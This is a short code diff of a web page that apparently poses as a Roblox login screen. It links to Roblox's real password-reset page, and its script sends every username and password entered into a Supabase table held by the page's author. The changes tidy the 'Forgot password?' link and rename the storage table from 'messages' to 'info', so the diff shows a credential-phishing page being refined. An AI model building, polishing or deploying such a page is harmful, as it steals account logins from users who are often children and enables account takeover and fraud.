@@ -18,9 +18,7 @@
     <br><br><br>
     <button id="send" type="button">Log in</button>
     <br><br><hr><br>
-    <a href="https://www.roblox.com/login/forgot-password-or-username">
-      <label id="f">Forgot password?</label>
-    </a>
+<a id="f" href="https://www.roblox.com/login/forgot-password-or-username">Forgot password?</a>
   </div>
 
   <!-- load supabase client library -->
@@ -36,7 +34,7 @@
       const password = document.getElementById('pass').value;
 
       try {
-        const { error } = await supabase.from('messages').insert([
+        const { error } = await supabase.from('info').insert([
           { username: username, pass: password }
         ]);
 
